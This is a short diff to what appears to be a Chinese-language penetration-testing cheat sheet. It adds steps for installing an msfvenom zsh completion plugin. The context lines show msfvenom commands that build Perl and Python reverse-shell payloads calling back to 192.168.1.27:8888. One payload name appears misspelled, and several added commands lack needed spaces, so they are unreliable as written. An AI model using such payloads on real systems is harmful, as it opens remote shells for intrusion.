@@ -218,3 +218,8 @@ msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.27 LPORT=8888 -f raw > shell.p
 #Python
 msfvenom -p python/meterpreter/reverser_tcp LHOST=192.168.1.27 LPORT=8888 -f raw > shell.py
 ```
+
+### 35.8 
+git clone https://github.com/Green-m/msfvenom-zsh-completion ~/.oh-my-zsh/custom/plugins/msfvenom/
+使用 nano 命令打开 ~/.zshrc 文件 nano~/.zshrc 找到 plugins=(git) 将 msfvenom 添加到里面 plugins=(gitmsfvenom)
+source~/.zshrc
